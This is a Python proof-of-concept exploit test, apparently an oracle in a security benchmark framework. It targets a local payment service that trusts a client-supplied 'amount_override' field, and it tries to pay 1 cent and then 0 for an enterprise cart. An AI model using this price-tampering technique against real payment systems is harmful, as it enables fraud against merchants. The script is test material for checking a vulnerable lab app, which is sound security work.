"""PoC exploit: Payment amount override via partner trust (CWE-20).

After stage 3, the server accepts amount_override from the client.
An attacker sends amount_override=1 to pay 1 cent for any cart.
"""

from mosaic.oracle.exploit import ExploitTest


class AmountTrustExploit(ExploitTest):
    """Amount trust: client sets payment amount to 1 cent."""

    def __init__(self, base_url: str = "http://localhost:4243"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "stripe_amount_trust"

    def execute(self) -> tuple[bool, str]:
        """Create payment with amount_override=1."""
        evidence = []

        # Baseline: normal cart payment
        baseline = self.http_post("/create-cart-payment", json={
            "items": [
                {"product_id": "prod_enterprise", "quantity": 5},
            ],
            "currency": "usd",
        })
        if baseline.ok:
            try:
                data = baseline.json()
                baseline_amount = data.get("amount_calculated") or data.get("total")
                evidence.append(f"Baseline: 5x enterprise = {baseline_amount} cents")
            except Exception:
                pass

        # Attack: override to 1 cent
        attack = self.http_post("/create-cart-payment", json={
            "items": [
                {"product_id": "prod_enterprise", "quantity": 5},
            ],
            "currency": "usd",
            "amount_override": 1,
        })

        if not attack.ok:
            return False, f"Attack failed: {attack.status_code}. {attack.text[:300]}"

        try:
            data = attack.json()
            amount = data.get("amount_calculated") or data.get("total") or data.get("amount")
            client_secret = data.get("clientSecret") or data.get("client_secret")

            if amount is not None and int(amount) == 1:
                evidence.append(f"amount_override=1 accepted, amount={amount}")
                return True, (
                    f"Payment amount override confirmed (CWE-20). Server accepted "
                    f"amount_override=1 (1 cent) for a cart worth ~$999.95. "
                    f"Client secret: {str(client_secret)[:20]}... "
                    + " | ".join(evidence)
                )

            if amount is not None and int(amount) <= 100:
                evidence.append(f"Amount unusually low: {amount} cents")
                return True, (
                    f"Payment amount override likely confirmed (CWE-20). "
                    f"Amount={amount} cents for enterprise cart. "
                    + " | ".join(evidence)
                )

            evidence.append(f"Attack response: amount={amount}")
        except Exception as e:
            evidence.append(f"Parse error: {e}")

        # Try zero amount
        zero = self.http_post("/create-cart-payment", json={
            "items": [{"product_id": "prod_premium", "quantity": 1}],
            "currency": "usd",
            "amount_override": 0,
        })
        if zero.ok:
            try:
                data = zero.json()
                amount = data.get("amount_calculated") or data.get("total") or data.get("amount")
                if amount is not None and int(amount) == 0:
                    return True, (
                        f"Payment amount override confirmed (CWE-20). "
                        f"amount_override=0 accepted. " + " | ".join(evidence)
                    )
            except Exception:
                pass

        return False, "Amount override not confirmed. " + " | ".join(evidence)
